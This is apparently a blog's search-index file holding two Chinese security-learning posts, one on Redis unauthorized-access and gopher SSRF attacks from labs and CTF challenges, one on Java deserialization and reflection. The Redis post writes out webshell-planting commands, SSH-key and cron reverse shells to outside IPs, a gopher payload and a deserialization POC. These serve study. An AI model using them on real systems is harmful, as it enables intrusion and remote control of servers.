<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>redis安全</title>
    <url>/2024/03/31/redis%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<p>redis未授权访问漏洞</p>
<p>redis gopher协议</p>
<span id="more"></span>

<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>docker </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose.yml</span><br></pre></td></tr></table></figure>

<p>搭建</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version: &#x27;2&#x27;</span><br><span class="line">services:</span><br><span class="line"> redis:</span><br><span class="line">   image: vulhub/redis:4.0.14</span><br><span class="line">   ports:</span><br><span class="line">    - &quot;6379:6379&quot;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -i -t  855bdddf0f35 /bin/bash</span><br><span class="line">docker inspect 855bdddf0f35</span><br></pre></td></tr></table></figure>

<p>由于搭建在docker 无法ssh 登录， 但可以进入docker 看到文件写入</p>
<p>扫描redis 详细信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -p 6379 -script redis-info 172.19.0.1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="redis未授权访问漏洞"><a href="#redis未授权访问漏洞" class="headerlink" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p><strong>Redis &lt;&#x3D; 5.0.5</strong></p>
<p>可以使用redis-tools，远程登录，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 172.19.0.1</span><br></pre></td></tr></table></figure>

<p>redis 写入shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 172.19.0.1</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename redis.php</span><br><span class="line">set webshell &quot;&lt;?php eval($_POST[1]); ?&gt;&quot;</span><br><span class="line">或者</span><br><span class="line">set x &quot;\r\n\r\n&lt;?php eval($_POST[1]); ?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>成功写入内容</p>
<p>\r\n\r\n代表换行的意思，用redis写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。</p>
<p>进入docker </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -i -t  redisdocker_redis_1 /bin/bash</span><br></pre></td></tr></table></figure>

<p>写入不进去 进入docker 给目录加权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod  777 *</span><br></pre></td></tr></table></figure>

<h2 id="ssh-登录"><a href="#ssh-登录" class="headerlink" title="ssh 登录"></a>ssh 登录</h2><p>需要redis 以root 启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">输入密码</span><br><span class="line">两次</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; 1.txt</span><br><span class="line">#写入1.txt</span><br><span class="line">cat 1.txt | redis-cli -h 172.19.0.1 -x set crack</span><br><span class="line">#将保存ssh的公钥1.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入）</span><br><span class="line">#并使用 CONFIG GET dir 命令得到redis备份的路径</span><br><span class="line">redis-cli -h 172.19.0.1</span><br><span class="line">config set dir /root/.ssh </span><br><span class="line">#	更改redis备份路径为ssh公钥存放目录（一般为/root/.ssh）</span><br><span class="line">#设置上传公钥的备份文件名字为authorized_key s</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">config get dbfilename #检查是否更改成功 </span><br><span class="line">ssh -i id_rsa root@172.19.0.1</span><br></pre></td></tr></table></figure>

<h2 id="定时任务crontab"><a href="#定时任务crontab" class="headerlink" title="定时任务crontab"></a>定时任务crontab</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.157.129</span><br><span class="line">config set dir /var/spool/cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.157.137/9897 0&gt;&amp;1\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>python 弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; get 1</span><br><span class="line">&quot;\n* * * * * /usr/bin/python -c &#x27;import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;115.28.78.16\&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#x27;\n&quot;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5、设置密码redis.conf</span><br><span class="line">requirepass 修改如下</span><br><span class="line">requirepass yourpassword</span><br><span class="line">yourpassword就是redis验证密码，设置密码以后发现可以登陆，但是无法执行命令了。</span><br><span class="line">命令如下:</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/YouthBelief/article/details/121020672">Redis漏洞利用总结_redis 5.0.5 漏洞-CSDN博客</a></p>
<h2 id="gopher协议攻击内网redis"><a href="#gopher协议攻击内网redis" class="headerlink" title="gopher协议攻击内网redis"></a>gopher协议攻击内网redis</h2><h3 id="ctfshow-web360"><a href="#ctfshow-web360" class="headerlink" title="ctfshow web360"></a>ctfshow web360</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://gitcode.com/tarunkant/Gopherus/overview?utm_source=csdn_github_accelerator&isLogin=1">项目概览 - Gopherus - GitCode</a></p>
<p>url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:6379</p>
<p>发现响应时间很长</p>
<p><img src="https://s2.loli.net/2024/04/01/RFIux93lpXymNeo.png">  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2428%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B1%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br></pre></td></tr></table></figure>

<p>后边的url编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252428%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B1%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</span><br></pre></td></tr></table></figure>

<p>发包504 </p>
<p><img src="https://s2.loli.net/2024/04/01/NRHbu58ftJQPimq.png"></p>
<p>证明写入</p>
<p>蚁剑连接即可</p>
<h1 id="Redis主从复制-RCE"><a href="#Redis主从复制-RCE" class="headerlink" title="Redis主从复制 RCE"></a>Redis主从复制 RCE</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>getshell python脚本</p>
<p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python redis-rogue-server.py --rhost 172.19.0.2 --lhost 127.0.0.1</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python redis-rce.py -r 172.19.0.2  -L 127.0.0.1 -f exp.so</span><br></pre></td></tr></table></figure>

<p>可以用来绕过disable_function</p>
<h2 id="天翼杯-2021-esay-eval"><a href="#天翼杯-2021-esay-eval" class="headerlink" title="[天翼杯 2021]esay_eval"></a>[天翼杯 2021]esay_eval</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">a</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/&quot;[BA]&quot;:(.*?):/s&#x27;</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>],<span class="variable">$ret</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$ret</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$ret</span>[<span class="number">1</span>] <span class="keyword">as</span> <span class="variable">$i</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$i</span>)!==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&quot;you want to bypass wakeup ? no !&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>]);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>poc 如下</p>
<p>类的名字可以通过大小写绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class a&#123;</span><br><span class="line">	public $code = &#x27;eval($_POST[1]);&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class b&#123;</span><br><span class="line">	public $a;</span><br><span class="line">&#125;</span><br><span class="line">$b = new B();</span><br><span class="line">$b-&gt;a = new A();</span><br><span class="line">echo serialize($b);</span><br></pre></td></tr></table></figure>

<p>wakeup 可以修改属性的数量来绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?poc=O:1:%22b%22:2:&#123;s:1:%22a%22;O:1:%22a%22:1:&#123;s:4:%22code%22;s:16:%22eval($_POST[1]);%22;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>发现无法命令执行，disable_function禁用所有命令执行的函数</p>
<p>查看 config.php.swp 发现redis 数据库密码 you_cannot_guess_it</p>
<p>进行蚁剑redis数据管理插件 连接 随意打开一个数据库， 进行命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">蚁剑Redis插件地址： https://github.com/Medicean/AS_Redis</span><br></pre></td></tr></table></figure>

<p>先在有权限的目录上传一个exp.so文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件地址：https://github.com/Dliv3/redis-rogue-server</span><br></pre></td></tr></table></figure>

<p>redis 命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MODULE LOAD /var/www/html/exp.so</span><br><span class="line">system.exec &quot;ls&quot;</span><br></pre></td></tr></table></figure>







<p><a href="https://ilikeoyt.github.io/2023/06/07/redis%E6%9C%AA%E6%8E%88%E6%9D%83/">redis未授权 | ycx’s blog (ilikeoyt.github.io)</a></p>
<p><a href="https://www.cnblogs.com/bmjoker/p/9548962.html">(<em>´∇｀</em>) 欢迎回来！ (cnblogs.com)</a></p>
]]></content>
  </entry>
  <entry>
    <title>java反序列化</title>
    <url>/2024/03/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>java 基础</p>
<span id="more"></span>

<p>java 命令执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">serialization</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;notepad.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="反序列化基础"><a href="#反序列化基础" class="headerlink" title="反序列化基础"></a>反序列化基础</h2><p>JDK类库中序列化API</p>
<p>问什么会产生安全问题</p>
<p><strong>只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击这在服务器上运行代码的能力。</strong></p>
<p>可能的形式</p>
<ol>
<li>入口类的readObject直接调用危险方法</li>
<li>入口类参数中包含可控类，该类有危险方法，readObject时调用。</li>
<li>入口类参数中包含可控类，该类又调用其他，有危险方法的类，readObject时调用</li>
</ol>
<p>比如类型定义为Object 调用equals&#x2F;hashcode&#x2F;toString</p>
<p>重点 相同类型 ，同名函数</p>
<p>4.构造函数&#x2F;静态代码块等类加载时隐式执行.</p>
<p>共同条件，继承Serializable</p>
<p>入口类source （重写readObject 调用常见的函数，参数类型宽泛，最好jdk自带）</p>
<p>调用链 gadget chain</p>
<p>执行类 sink (rce ssrf写文件等等)</p>
<p><strong>java.io.ObjectOutputStream：表示对象输出流</strong></p>
<p>它的writeObject(Object obj)方法可以对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。</p>
<p><strong>java.io.ObjectInputStream：表示对象输入流</strong></p>
<p>它的readObject()方法源输入流中读取字节序列，再把它们反序列化成为一个对象，并将其返回</p>
<p> 5.transient 标识的对象成员变量不参与序列化</p>
<p>Person.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Externalizable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>  <span class="comment">//implements Serializable 序列化的接口</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span>  <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span> <span class="params">(String name,<span class="type">int</span> age)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.name =name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span>+</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span>+name+<span class="string">&#x27;\&#x27;&#x27;</span>+</span><br><span class="line">                <span class="string">&quot;,age=&quot;</span>+age+</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois )</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">   &#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Serialize.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"> <span class="keyword">class</span> <span class="title class_">serializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span>  <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[]args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aa&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Unserialize.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializeTest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span>  IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span>(Person)unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通过序列化和反序列化实现弹窗</p>
<p><a href="https://github.com/frohoff/ysoserial/">frohoff&#x2F;ysoserial: A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. (github.com)</a></p>
<h2 id="java-反射"><a href="#java-反射" class="headerlink" title="java 反射"></a>java 反射</h2><p>正射</p>
<p>我们在编写代码时，当需要到某一个类的时候，都会先了解这个类是做什么的，然后再实例化这个类，接着实例化好的对象进行操作，这就是正射，</p>
<p>反射</p>
<p>反射就是，一开始并不知道我们要初始化的类的对象是什么，自然也无法使用new 关键字来创建对象了。</p>
<p>反射的作用：让java具有动态性</p>
<p><img src="https://s3.bmp.ovh/imgs/2024/02/19/7f083dc556181c68.png"></p>
<p><strong>1.第一阶段：代码阶段&#x2F;编译阶段</strong></p>
<p>最开始学习java时，我们都会创建一个.java后缀的文件，然后在里面写上我们的代码。运行前通过javac对其进行编译，得到一个.class后缀的字节码文件</p>
<p><strong>2.第二阶段：类加载阶段（Class类阶段）</strong></p>
<p>当执行new一个对象时，会先通过类加载器ClassLoader将我们所需要的类进行加载（此处就体现了反射），这里的类加载是以.class后缀文件为基础的。加载完后，在堆中会产生一个Class类型的对象（一个类只有一个Class对象），这个对象包含了类的完整结构信息（成员变量、构造器、成员方法等），通过这个对象得到类的结构。（Class对象就像是一面镜子，透过这个镜子看到类的结构，故形象的称之为反射）</p>
<p><strong>3.第三阶段：Runtime运行阶段</strong></p>
<p>在运行阶段，我们通过new的方式创建的对象是在堆中，该对象知道它是属于哪个Class对象。若我们得到Class对象，也同样可以通过它来创建对象，调用对象方法，操作属性等。</p>
<p>java中与反射相关的类主要有四个：</p>
<ol>
<li><p><strong>java.lang.Class</strong></p>
<p>代表一个类，Class对象表示某个类加载后在堆中的对象</p>
</li>
<li><p><strong>java.lang.reflect.Method</strong></p>
<p>代表类的方法，Method对象表示某个类的方法</p>
</li>
<li><p><strong>java.lang.reflect.Field</strong></p>
<p>代表类的成员变量，Field对象表示某个类的成员变量</p>
</li>
<li><p><strong>java.lang.reflect.Constructor</strong></p>
<p>代表类的构造方法，Constructor对象表示构造器</p>
</li>
</ol>
<p><strong>修改已有对象的属性， 动态生成对象，动态调用方法，操作内部类和私有方法。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefkectionTest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        Class c=person.getClass();</span><br><span class="line">        <span class="comment">//反射就是操作Class</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//从原型class里面实例化对象</span></span><br><span class="line">        <span class="comment">// c.newInstance();</span></span><br><span class="line">        Constructor personconstructor=c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span>(Person) personconstructor.newInstance(<span class="string">&quot;abdc&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//获取类里面的属性</span></span><br><span class="line">        Field[] personfields= c.getFields();</span><br><span class="line">        <span class="keyword">for</span>(Field f:personfields)</span><br><span class="line">        &#123;</span><br><span class="line">         System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//调用类里面的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>1.Class类对象不是new出来的，而是系统创建的</strong></p>
<p>在类加载时，通过类加载器ClassLoader的loadClass方法得到该类的Class对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefkectionTest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        Class c=person.getClass();</span><br><span class="line">        <span class="comment">//反射就是操作Class</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//从原型class里面实例化对象</span></span><br><span class="line">        <span class="comment">// c.newInstance();</span></span><br><span class="line">        Constructor personconstructor=c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span>(Person) personconstructor.newInstance(<span class="string">&quot;abdc&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//获取类里面的属性</span></span><br><span class="line"><span class="comment">/*        Field[] personfields= c.getFields();</span></span><br><span class="line"><span class="comment">        for(Field f:personfields)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">         System.out.println(f);</span></span><br><span class="line"><span class="comment">        &#125;*/</span></span><br><span class="line">        Field namefield=c.getField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        namefield.set(p,<span class="number">25</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//调用类里面的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.bmp.ovh/imgs/2023/10/05/80e1c006911a108c.png"></p>
<p>无法修改，由于age是私有属性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefkectionTest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        Class c=person.getClass();</span><br><span class="line">        <span class="comment">//反射就是操作Class</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//从原型class里面实例化对象</span></span><br><span class="line">        <span class="comment">// c.newInstance();</span></span><br><span class="line">        Constructor personconstructor=c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span>(Person) personconstructor.newInstance(<span class="string">&quot;abdc&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//获取类里面的属性</span></span><br><span class="line"><span class="comment">/*        Field[] personfields= c.getFields();</span></span><br><span class="line"><span class="comment">        for(Field f:personfields)</span></span><br><span class="line"><span class="comment">        